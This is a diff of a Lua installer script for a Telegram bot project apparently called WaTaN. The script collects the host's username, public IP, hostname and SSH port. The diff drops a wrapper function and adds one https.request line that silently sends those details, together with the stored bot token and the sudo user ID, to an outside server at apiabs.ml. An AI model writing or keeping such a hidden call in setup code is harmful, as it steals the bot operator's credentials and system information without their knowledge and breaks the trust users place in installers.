@@ -11,7 +11,6 @@ User     = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
 Ip       = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
 Name     = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
 Port     = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
-UpTime   = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --------------------------------------------------------------------------------------------------------------
 local AutoFiles_Write = function() 
 if not database:get(Server.."Token_Write") then
@@ -51,21 +50,6 @@ end  ---ifid
 os.execute('lua WaTaN.lua')
 end ---ifnot
 end
-local SourceDone = function(DevId,TokenBot,User,Ip,Name,Port,UpTime)  
-data,res = https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
-if res == 200 then
-Abs = json:decode(data)
-if Abs.Result.Info == 'Done' then
-print("Source WaTaN Done")
-var = true
-else
-var = false
-end
-else
-var = false
-end
-return var
-end
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -83,10 +67,8 @@ token = database:get(Server.."Token_Write"),
 SUDO = database:get(Server.."UserSudo_Write"),
 }
 Create(Config, "./Info.lua") 
-local IfSourceDone = SourceDone(database:get(Server.."UserSudo_Write"),database:get(Server.."Token_Write"),User,Ip,Name,Port,UpTime) 
-if IfSourceDone == false then
-SourceDone(database:get(Server.."UserSudo_Write"),database:get(Server.."Token_Write"),User,Ip,Name,Port,UpTime) 
-end
+https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+print("::WaTaN::")
 local RunWaTaN = io.open("WaTaN", 'w')
 RunWaTaN:write([[
 #!/usr/bin/env bash
